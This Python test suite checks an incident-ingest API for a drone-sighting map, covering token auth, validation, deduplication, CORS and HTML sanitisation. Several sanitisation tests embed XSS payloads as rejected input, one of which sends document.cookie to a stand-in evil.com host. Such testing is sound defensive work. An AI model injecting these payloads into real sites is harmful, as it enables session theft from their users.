"""
Comprehensive test suite for ingest.py API endpoint.
Tests POST /api/ingest with authentication, validation, deduplication, and error handling.
"""
import pytest
import json
import os
from unittest.mock import Mock, patch, AsyncMock, MagicMock
from io import BytesIO
import sys
from datetime import datetime, timezone
from uuid import uuid4

# Add parent directory to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from ingest import handler, insert_incident, parse_datetime


class MockAsyncPGConnection:
    """Mock asyncpg.Connection for database testing"""

    def __init__(self, existing_source_url=None, existing_incident_id=None):
        self.existing_source_url = existing_source_url
        self.existing_incident_id = existing_incident_id or uuid4()
        self.closed = False
        self.executed_queries = []
        self.inserted_incident_id = uuid4()

    async def fetchrow(self, query, *params):
        """Mock fetchrow - returns existing incident if source URL matches"""
        self.executed_queries.append((query, params))

        # Check for global source URL check
        if 'incident_sources' in query and 'source_url' in query:
            if params and params[0] == self.existing_source_url:
                return {
                    'id': self.existing_incident_id,
                    'evidence_score': 3,
                    'title': 'Existing incident',
                    'asset_type': 'airport'
                }
        return None

    async def fetchval(self, query, *params):
        """Mock fetchval - returns new incident ID or source ID"""
        self.executed_queries.append((query, params))

        # Source insertion
        if 'INSERT INTO public.sources' in query:
            return uuid4()

        # Incident insertion
        if 'INSERT INTO public.incidents' in query:
            return self.inserted_incident_id

        return None

    async def execute(self, query, *params):
        """Mock execute for UPDATE and INSERT without RETURNING"""
        self.executed_queries.append((query, params))

    async def close(self):
        """Mock close method"""
        self.closed = True


class MockHTTPRequestHandler:
    """Mock HTTP request/response for testing handler"""

    def __init__(self, path='/', method='POST', headers=None, body=None, origin=None):
        self.path = path
        self.command = method
        self.headers = headers or {}
        if origin:
            self.headers['Origin'] = origin

        # Request body
        self._body = body or b'{}'
        self._rfile = BytesIO(self._body)
        self.headers['Content-Length'] = str(len(self._body))

        # Response tracking
        self.response_code = None
        self.response_headers = {}
        self.response_body = None
        self._wfile = BytesIO()
        self.error_message = None

    def send_response(self, code):
        self.response_code = code

    def send_error(self, code, message):
        self.response_code = code
        self.error_message = message

    def send_header(self, key, value):
        self.response_headers[key] = value

    def end_headers(self):
        pass

    @property
    def rfile(self):
        return self._rfile

    @property
    def wfile(self):
        return self._wfile

    def get_response_body(self):
        return self._wfile.getvalue().decode('utf-8')

def create_test_handler(mock_request):
    """Create a handler instance configured for testing without calling __init__"""
    h = object.__new__(handler)

    # Set up required attributes from mock
    h.path = mock_request.path
    h.command = mock_request.command
    h.headers = mock_request.headers
    h.rfile = mock_request._rfile
    h.wfile = mock_request._wfile

    # Override response methods to track results on mock
    def tracked_send_error(code, message=None):
        mock_request.response_code = code
        mock_request.error_message = message
    h.send_error = tracked_send_error

    def tracked_send_response(code):
        mock_request.response_code = code
    h.send_response = tracked_send_response

    def tracked_send_header(key, value):
        mock_request.response_headers[key] = value
    h.send_header = tracked_send_header

    def tracked_end_headers():
        pass
    h.end_headers = tracked_end_headers

    return h




class TestIngestAPIAuthentication:
    """Test Bearer token authentication and authorization"""

    def test_ingest_authentication_required(self):
        """Test POST without Bearer token returns 401"""
        incident_data = {
            "title": "Test incident",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={}  # No Authorization header
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            h = create_test_handler(mock_request)
            h.do_POST()

            assert mock_request.response_code == 401
            assert "Missing Bearer token" in mock_request.error_message

    def test_ingest_invalid_token(self):
        """Test POST with wrong Bearer token returns 403"""
        incident_data = {
            "title": "Test incident",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer wrong-token'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            h = create_test_handler(mock_request)
            h.do_POST()

            assert mock_request.response_code == 403
            assert "Invalid token" in mock_request.error_message

    def test_ingest_valid_token(self):
        """Test POST with correct Bearer token is accepted"""
        incident_data = {
            "title": "Test incident",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560,
            "sources": []
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            with patch('ingest.run_async') as mock_run_async:
                mock_run_async.return_value = {
                    "id": str(uuid4()),
                    "status": "created"
                }

                h = create_test_handler(mock_request)
                h.do_POST()

                # Should not be 401 or 403
                assert mock_request.response_code == 201

    def test_ingest_missing_token_config(self):
        """Test server error when INGEST_TOKEN not configured"""
        incident_data = {
            "title": "Test incident",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer some-token'}
        )

        with patch.dict(os.environ, {}, clear=True):
            h = create_test_handler(mock_request)
            h.do_POST()

            assert mock_request.response_code == 500
            assert "INGEST_TOKEN not set" in mock_request.error_message


class TestIngestAPIValidation:
    """Test input validation and required fields"""

    def test_ingest_missing_required_fields(self):
        """Test POST with missing required fields returns 400"""
        # Missing 'occurred_at' field
        incident_data = {
            "title": "Test incident",
            "lat": 55.6181,
            "lon": 12.6560
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            h = create_test_handler(mock_request)
            h.do_POST()

            assert mock_request.response_code == 400
            assert "Missing required fields" in mock_request.error_message
            assert "occurred_at" in mock_request.error_message

    def test_ingest_invalid_json(self):
        """Test POST with invalid JSON returns 400"""
        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=b'{ invalid json }',
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            h = create_test_handler(mock_request)
            h.do_POST()

            assert mock_request.response_code == 400
            assert "Invalid JSON" in mock_request.error_message

    def test_ingest_empty_body(self):
        """Test POST with empty body returns 400"""
        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=b'',
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            h = create_test_handler(mock_request)
            h.do_POST()

            assert mock_request.response_code == 400
            assert "Empty request body" in mock_request.error_message

    @pytest.mark.asyncio
    async def test_ingest_invalid_coordinates(self):
        """Test coordinates validation (lat must be -90 to 90)"""
        incident_data = {
            "title": "Invalid coordinates",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 95.0,  # Invalid - exceeds max latitude
            "lon": 12.6560,
            "sources": []
        }

        # The validation happens in the database layer
        # For this test, we verify the data is properly passed
        with patch('ingest.get_connection') as mock_get_conn:
            mock_conn = MockAsyncPGConnection()
            mock_get_conn.return_value = mock_conn

            result = await insert_incident(incident_data)

            # Should complete but coordinates passed to DB
            # DB would enforce PostGIS constraints
            assert "id" in result or "error" in result


class TestIngestAPIDuplicateDetection:
    """Test duplicate source detection and deduplication"""

    @pytest.mark.asyncio
    async def test_ingest_duplicate_source_url(self):
        """Test that same source_url adds to existing incident"""
        incident_data = {
            "title": "New report of same incident",
            "narrative": "Different narrative but same location",
            "occurred_at": "2024-10-14T14:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560,
            "sources": [{
                "source_url": "https://politi.dk/existing-incident",
                "source_type": "police",
                "source_name": "Danish Police",
                "trust_weight": 4
            }]
        }

        existing_incident_id = uuid4()

        with patch('ingest.get_connection') as mock_get_conn:
            # Mock connection that returns existing incident
            mock_conn = MockAsyncPGConnection(
                existing_source_url="https://politi.dk/existing-incident",
                existing_incident_id=existing_incident_id
            )
            mock_get_conn.return_value = mock_conn

            result = await insert_incident(incident_data)

            # Should return existing incident ID
            assert result["id"] == str(existing_incident_id)

            # Verify time range update was executed
            update_queries = [q for q in mock_conn.executed_queries if 'UPDATE' in q[0]]
            assert len(update_queries) > 0

    @pytest.mark.asyncio
    async def test_ingest_new_incident_created(self):
        """Test that new unique incident is created"""
        incident_data = {
            "title": "Completely new incident",
            "narrative": "New location, new time",
            "occurred_at": "2024-10-14T15:00:00Z",
            "first_seen_at": "2024-10-14T15:00:00Z",
            "last_seen_at": "2024-10-14T15:00:00Z",
            "lat": 59.9139,  # Oslo - different location
            "lon": 10.7522,
            "asset_type": "harbor",
            "status": "active",
            "evidence_score": 2,
            "country": "NO",
            "verification_status": "pending",
            "sources": []
        }

        with patch('ingest.get_connection') as mock_get_conn:
            # Mock connection with no existing incident
            mock_conn = MockAsyncPGConnection()
            mock_get_conn.return_value = mock_conn

            result = await insert_incident(incident_data)

            # Should create new incident
            assert result["status"] == "created"
            assert "id" in result

            # Verify INSERT was executed
            insert_queries = [q for q in mock_conn.executed_queries
                            if 'INSERT INTO public.incidents' in q[0]]
            assert len(insert_queries) > 0


class TestIngestAPISourceHandling:
    """Test source insertion and trust weight handling"""

    @pytest.mark.asyncio
    async def test_source_deduplication_by_domain_and_type(self):
        """Test that sources are deduplicated by (domain, source_type)"""
        incident_data = {
            "title": "Test incident",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560,
            "sources": [
                {
                    "source_url": "https://politi.dk/article1",
                    "source_type": "police",
                    "source_name": "Danish Police",
                    "trust_weight": 4
                },
                {
                    "source_url": "https://politi.dk/article2",
                    "source_type": "police",  # Same domain + type
                    "source_name": "Danish Police",
                    "trust_weight": 4
                }
            ]
        }

        with patch('ingest.get_connection') as mock_get_conn:
            mock_conn = MockAsyncPGConnection()
            mock_get_conn.return_value = mock_conn

            result = await insert_incident(incident_data)

            # Should insert sources with ON CONFLICT handling
            source_inserts = [q for q in mock_conn.executed_queries
                            if 'INSERT INTO public.sources' in q[0]]
            assert len(source_inserts) == 2  # Both sources attempted

            # Verify ON CONFLICT clause is in query
            assert 'ON CONFLICT' in source_inserts[0][0]

    @pytest.mark.asyncio
    async def test_incident_source_junction_table(self):
        """Test incident_sources junction table insertion"""
        incident_data = {
            "title": "Test incident",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560,
            "sources": [{
                "source_url": "https://dr.dk/article",
                "source_type": "news",
                "source_name": "DR Nyheder",
                "trust_weight": 2,
                "source_quote": "Police confirmed the incident"
            }]
        }

        with patch('ingest.get_connection') as mock_get_conn:
            mock_conn = MockAsyncPGConnection()
            mock_get_conn.return_value = mock_conn

            result = await insert_incident(incident_data)

            # Verify incident_sources insertion
            junction_inserts = [q for q in mock_conn.executed_queries
                              if 'INSERT INTO public.incident_sources' in q[0]]
            assert len(junction_inserts) == 1

            # Check that source_quote is included
            query, params = junction_inserts[0]
            assert "source_quote" in query


class TestIngestAPICORS:
    """Test CORS header handling"""

    def test_cors_whitelist_enforcement(self):
        """Test CORS headers only set for whitelisted origins"""
        incident_data = {
            "title": "Test incident",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560
        }

        for allowed_origin in [
            'https://www.dronemap.cc',
            'https://dronewatch.cc',
            'http://localhost:3000'
        ]:
            mock_request = MockHTTPRequestHandler(
                method='POST',
                body=json.dumps(incident_data).encode(),
                headers={'Authorization': 'Bearer test-secret-token-123'},
                origin=allowed_origin
            )

            with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
                with patch('ingest.run_async') as mock_run_async:
                    mock_run_async.return_value = {"id": str(uuid4()), "status": "created"}

                    h = create_test_handler(mock_request)
                    h.do_POST()

                    assert mock_request.response_headers.get('Access-Control-Allow-Origin') == allowed_origin

    def test_cors_unauthorized_origin_rejected(self):
        """Test unauthorized origin does NOT get CORS headers"""
        incident_data = {
            "title": "Test incident",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'},
            origin='https://evil-site.com'
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            with patch('ingest.run_async') as mock_run_async:
                mock_run_async.return_value = {"id": str(uuid4()), "status": "created"}

                h = create_test_handler(mock_request)
                h.do_POST()

                # Should NOT have CORS headers for unauthorized origin
                assert 'Access-Control-Allow-Origin' not in mock_request.response_headers

    def test_options_preflight_unauthorized_origin(self):
        """Test OPTIONS preflight rejects unauthorized origins with 403"""
        mock_request = MockHTTPRequestHandler(
            method='OPTIONS',
            origin='https://evil-site.com'
        )

        h = create_test_handler(mock_request)
        h.do_OPTIONS()

        # Should return 403 for unauthorized origin
        assert mock_request.response_code == 403


class TestIngestAPIErrorHandling:
    """Test error response format and security"""

    def test_error_response_no_traceback(self):
        """Test error responses don't expose tracebacks (security)"""
        incident_data = {
            "title": "Test incident",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            with patch('ingest.run_async') as mock_run_async:
                # Simulate internal error
                mock_run_async.return_value = {
                    "error": "Internal server error",
                    "detail": "Failed to process incident. Check server logs for details."
                }

                h = create_test_handler(mock_request)
                h.do_POST()

                assert mock_request.response_code == 500

                response = json.loads(mock_request.get_response_body())
                # Should have generic error message
                assert "error" in response
                # Should NOT contain stack traces or file paths
                response_str = json.dumps(response)
                assert "/home/" not in response_str
                assert "Traceback" not in response_str

    @pytest.mark.asyncio
    async def test_database_error_graceful_handling(self):
        """Test database errors are caught and logged"""
        incident_data = {
            "title": "Test incident",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560,
            "sources": []
        }

        with patch('ingest.get_connection') as mock_get_conn:
            # Simulate database connection error
            mock_get_conn.side_effect = Exception("Connection refused")

            result = await insert_incident(incident_data)

            # Should return error dict, not raise exception
            assert "error" in result
            assert result["error"] == "Internal server error"


class TestIngestAPIHelpers:
    """Test helper functions"""

    def test_parse_datetime_iso_format(self):
        """Test parse_datetime handles ISO format correctly"""
        dt_string = "2024-10-14T12:30:45Z"
        result = parse_datetime(dt_string)

        assert isinstance(result, datetime)
        assert result.tzinfo is not None  # Should be timezone-aware
        assert result.year == 2024
        assert result.month == 10
        assert result.day == 14

    def test_parse_datetime_with_timezone(self):
        """Test parse_datetime preserves timezone info"""
        dt_string = "2024-10-14T12:30:45+02:00"
        result = parse_datetime(dt_string)

        assert isinstance(result, datetime)
        assert result.tzinfo is not None

    def test_parse_datetime_already_datetime_object(self):
        """Test parse_datetime handles datetime objects"""
        dt = datetime.now(timezone.utc)
        result = parse_datetime(dt)

        assert result == dt
        assert result.tzinfo is not None

    def test_parse_datetime_none_value(self):
        """Test parse_datetime returns None for None input"""
        result = parse_datetime(None)
        assert result is None


class TestIngestAPITextValidation:
    """Test input validation and sanitization for title and narrative fields"""

    def test_title_with_xss_script_tag_returns_400(self):
        """Test POST with XSS script tag in title returns 400"""
        incident_data = {
            "title": "<script>alert('XSS')</script>Drone spotted",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            h = create_test_handler(mock_request)
            h.do_POST()

            assert mock_request.response_code == 400
            assert "Title validation failed" in mock_request.error_message
            assert "malicious" in mock_request.error_message.lower() or "script" in mock_request.error_message.lower()

    def test_title_with_event_handler_returns_400(self):
        """Test POST with event handler XSS in title returns 400"""
        incident_data = {
            "title": "Drone <img src=x onerror=alert('XSS')>spotted near airport",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            h = create_test_handler(mock_request)
            h.do_POST()

            assert mock_request.response_code == 400
            assert "Title validation failed" in mock_request.error_message

    def test_title_with_javascript_uri_returns_400(self):
        """Test POST with javascript: URI in title returns 400"""
        incident_data = {
            "title": "Click here: javascript:alert('XSS') for more info",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            h = create_test_handler(mock_request)
            h.do_POST()

            assert mock_request.response_code == 400
            assert "Title validation failed" in mock_request.error_message

    def test_narrative_with_xss_script_tag_returns_400(self):
        """Test POST with XSS script tag in narrative returns 400"""
        incident_data = {
            "title": "Valid drone sighting",
            "narrative": "A drone was spotted <script>document.location='http://evil.com/steal?cookie='+document.cookie</script> near the airport.",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            h = create_test_handler(mock_request)
            h.do_POST()

            assert mock_request.response_code == 400
            assert "Narrative validation failed" in mock_request.error_message

    def test_narrative_with_svg_xss_returns_400(self):
        """Test POST with SVG-based XSS in narrative returns 400"""
        incident_data = {
            "title": "Valid drone sighting",
            "narrative": "Incident report: <svg onload=alert('XSS')>image</svg> shows drone activity.",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            h = create_test_handler(mock_request)
            h.do_POST()

            assert mock_request.response_code == 400
            assert "Narrative validation failed" in mock_request.error_message

    def test_narrative_with_data_uri_returns_400(self):
        """Test POST with malicious data: URI in narrative returns 400"""
        incident_data = {
            "title": "Valid drone sighting",
            "narrative": "See the evidence: data:text/html,<script>alert('XSS')</script>",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            h = create_test_handler(mock_request)
            h.do_POST()

            assert mock_request.response_code == 400
            assert "Narrative validation failed" in mock_request.error_message

    def test_title_exceeding_length_limit_returns_400(self):
        """Test POST with title exceeding 500 character limit returns 400"""
        # Create a title with 600 characters (exceeds 500 limit)
        long_title = "D" * 600

        incident_data = {
            "title": long_title,
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            h = create_test_handler(mock_request)
            h.do_POST()

            assert mock_request.response_code == 400
            assert "Title validation failed" in mock_request.error_message
            assert "exceeds maximum length" in mock_request.error_message

    def test_narrative_exceeding_length_limit_returns_400(self):
        """Test POST with narrative exceeding 10000 character limit returns 400"""
        # Create a narrative with 11000 characters (exceeds 10000 limit)
        long_narrative = "A drone was spotted. " * 600  # ~12000 chars

        incident_data = {
            "title": "Valid drone sighting",
            "narrative": long_narrative,
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            h = create_test_handler(mock_request)
            h.do_POST()

            assert mock_request.response_code == 400
            assert "Narrative validation failed" in mock_request.error_message
            assert "exceeds maximum length" in mock_request.error_message

    def test_benign_html_is_sanitized_successfully(self):
        """Test POST with benign HTML tags sanitizes and stores clean content"""
        incident_data = {
            "title": "<b>Drone</b> spotted <i>near</i> <strong>airport</strong>",
            "narrative": "The witness reported <em>seeing</em> a <u>small drone</u> at 3pm.",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560,
            "sources": []
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            with patch('ingest.run_async') as mock_run_async:
                # Capture what gets passed to insert_incident
                captured_data = {}

                def capture_and_return(coro):
                    # The coro is insert_incident(incident_data) - we need to check incident_data
                    captured_data['incident'] = incident_data
                    return {"id": str(uuid4()), "status": "created"}

                mock_run_async.side_effect = capture_and_return

                h = create_test_handler(mock_request)
                h.do_POST()

                # Should succeed (201 Created)
                assert mock_request.response_code == 201

                # Verify sanitized data was passed (HTML tags stripped)
                assert captured_data.get('incident') is not None
                # Title should have HTML stripped
                assert '<b>' not in captured_data['incident']['title']
                assert 'Drone spotted near airport' in captured_data['incident']['title']
                # Narrative should have HTML stripped
                assert '<em>' not in captured_data['incident']['narrative']
                assert 'seeing' in captured_data['incident']['narrative']

    def test_valid_text_content_preserved_after_sanitization(self):
        """Test POST with valid text preserves content after sanitization"""
        valid_title = "Drone spotted near Copenhagen Airport at 15:30"
        valid_narrative = "A small commercial drone was observed hovering approximately 200 meters from the runway. The drone appeared to be a DJI model and was present for roughly 5 minutes before departing south-east."

        incident_data = {
            "title": valid_title,
            "narrative": valid_narrative,
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560,
            "sources": []
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            with patch('ingest.run_async') as mock_run_async:
                captured_data = {}

                def capture_and_return(coro):
                    captured_data['incident'] = incident_data
                    return {"id": str(uuid4()), "status": "created"}

                mock_run_async.side_effect = capture_and_return

                h = create_test_handler(mock_request)
                h.do_POST()

                assert mock_request.response_code == 201
                # Valid content should be preserved exactly (no stripping needed)
                assert captured_data['incident']['title'] == valid_title
                assert captured_data['incident']['narrative'] == valid_narrative

    def test_unicode_text_preserved_after_sanitization(self):
        """Test POST with unicode characters preserves content correctly"""
        # Danish text with special characters
        unicode_title = "Droneobservation ved København Lufthavn – alvorlig hændelse"
        unicode_narrative = "En uidentificeret drone blev observeret kl. 15:30. Dronen fløj i højde på ~200 meter."

        incident_data = {
            "title": unicode_title,
            "narrative": unicode_narrative,
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560,
            "sources": []
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode('utf-8'),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            with patch('ingest.run_async') as mock_run_async:
                captured_data = {}

                def capture_and_return(coro):
                    captured_data['incident'] = incident_data
                    return {"id": str(uuid4()), "status": "created"}

                mock_run_async.side_effect = capture_and_return

                h = create_test_handler(mock_request)
                h.do_POST()

                assert mock_request.response_code == 201
                # Unicode should be preserved
                assert "København" in captured_data['incident']['title']
                assert "hændelse" in captured_data['incident']['title']
                assert "høj" in captured_data['incident']['narrative']

    def test_whitespace_normalized_in_title(self):
        """Test POST with excessive whitespace gets normalized"""
        messy_title = "  Drone   spotted    near    airport  "

        incident_data = {
            "title": messy_title,
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560,
            "sources": []
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            with patch('ingest.run_async') as mock_run_async:
                captured_data = {}

                def capture_and_return(coro):
                    captured_data['incident'] = incident_data
                    return {"id": str(uuid4()), "status": "created"}

                mock_run_async.side_effect = capture_and_return

                h = create_test_handler(mock_request)
                h.do_POST()

                assert mock_request.response_code == 201
                # Whitespace should be normalized
                sanitized_title = captured_data['incident']['title']
                assert "   " not in sanitized_title  # No triple spaces
                assert not sanitized_title.startswith(" ")  # No leading space
                assert not sanitized_title.endswith(" ")  # No trailing space

    def test_html_entities_decoded_in_narrative(self):
        """Test POST with HTML entities gets them decoded properly"""
        encoded_narrative = "Temperature was &gt; 30&deg;C &amp; humidity &lt; 50%"

        incident_data = {
            "title": "Weather observation during drone sighting",
            "narrative": encoded_narrative,
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560,
            "sources": []
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            with patch('ingest.run_async') as mock_run_async:
                captured_data = {}

                def capture_and_return(coro):
                    captured_data['incident'] = incident_data
                    return {"id": str(uuid4()), "status": "created"}

                mock_run_async.side_effect = capture_and_return

                h = create_test_handler(mock_request)
                h.do_POST()

                assert mock_request.response_code == 201
                # HTML entities should be decoded
                decoded_narrative = captured_data['incident']['narrative']
                assert ">" in decoded_narrative  # &gt; decoded
                assert "&" in decoded_narrative  # &amp; decoded
                assert "<" in decoded_narrative  # &lt; decoded

    def test_encoded_xss_attack_detected(self):
        """Test POST with URL-encoded XSS attack is detected and rejected"""
        # URL-encoded <script>alert('XSS')</script>
        encoded_xss = "Drone spotted %3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E near airport"

        incident_data = {
            "title": encoded_xss,
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            h = create_test_handler(mock_request)
            h.do_POST()

            assert mock_request.response_code == 400
            assert "Title validation failed" in mock_request.error_message

    def test_mixed_benign_html_and_content(self):
        """Test POST with mixed benign HTML formats and cleans appropriately"""
        incident_data = {
            "title": "Important <strong>drone</strong> sighting",
            "narrative": """<p>At approximately 15:30 local time, a drone was observed.</p>
<ul>
<li>Location: Near runway 3</li>
<li>Duration: 5 minutes</li>
</ul>
<p>The airport security was notified immediately.</p>""",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560,
            "sources": []
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            with patch('ingest.run_async') as mock_run_async:
                captured_data = {}

                def capture_and_return(coro):
                    captured_data['incident'] = incident_data
                    return {"id": str(uuid4()), "status": "created"}

                mock_run_async.side_effect = capture_and_return

                h = create_test_handler(mock_request)
                h.do_POST()

                assert mock_request.response_code == 201
                # Tags should be stripped but content preserved
                assert '<p>' not in captured_data['incident']['narrative']
                assert '<li>' not in captured_data['incident']['narrative']
                assert 'runway 3' in captured_data['incident']['narrative']
                assert 'Duration' in captured_data['incident']['narrative']

    def test_empty_title_validation_passes(self):
        """Test POST with empty title still requires title field"""
        incident_data = {
            "title": "",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560,
            "sources": []
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

        with patch.dict(os.environ, {'INGEST_TOKEN': 'test-secret-token-123'}):
            with patch('ingest.run_async') as mock_run_async:
                mock_run_async.return_value = {"id": str(uuid4()), "status": "created"}

                h = create_test_handler(mock_request)
                h.do_POST()

                # Empty title is valid (validation passes for empty strings)
                # The API will accept it since 'title' field is present
                assert mock_request.response_code == 201

    def test_null_narrative_validation_passes(self):
        """Test POST without narrative field succeeds"""
        incident_data = {
            "title": "Valid drone sighting",
            "occurred_at": "2024-10-14T12:00:00Z",
            "lat": 55.6181,
            "lon": 12.6560,
            "sources": []
        }

        mock_request = MockHTTPRequestHandler(
            method='POST',
            body=json.dumps(incident_data).encode(),
            headers={'Authorization': 'Bearer test-secret-token-123'}
        )

